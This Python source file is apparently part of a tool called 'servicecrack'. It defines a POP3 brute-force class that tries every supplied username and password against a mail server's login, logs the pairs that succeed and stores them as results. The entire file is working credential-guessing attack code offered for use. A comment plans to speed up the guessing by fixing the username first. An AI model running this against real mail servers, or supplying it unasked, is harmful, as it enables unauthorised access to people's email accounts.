# coding: utf-8
import poplib

from servicecrack.service.Base import BaseCrack
from servicecrack.utils.logg import Logging

logging = Logging("pop3")

service_name = "pop3"


class Pop3Crack(BaseCrack):
    def __init__(self, host, port, usernames, passwords):
        super(Pop3Crack, self).__init__(host, port, usernames, passwords, service_name)
        if not port:
            self.port = 110

    def run(self):
        for username in self.usernames:
            for password in self.passwords:
                self.crack(username, password)
        logging.info("brute {} ending".format(self.service_name))
        logging.info(self.result)

    def crack(self, username, password):
        logging.debug("start use {} {}".format(username, password))
        success = 0
        try:
            server = poplib.POP3(host=self.host, port=self.port, timeout=self.timeout)
            server.user(username)
            # TODO 将用户名提前，单独爆破密码
            server.pass_(password)
            logging.info("brute success :{} {}".format(username, password))
            success = 1
        except Exception as e:
            logging.debug(e)
            logging.debug("brute faild:{} {}".format(username, password))
            server.close()
        finally:
            if not success:
                return
            server.close()
            self.result.append({"username": username, "password": password})

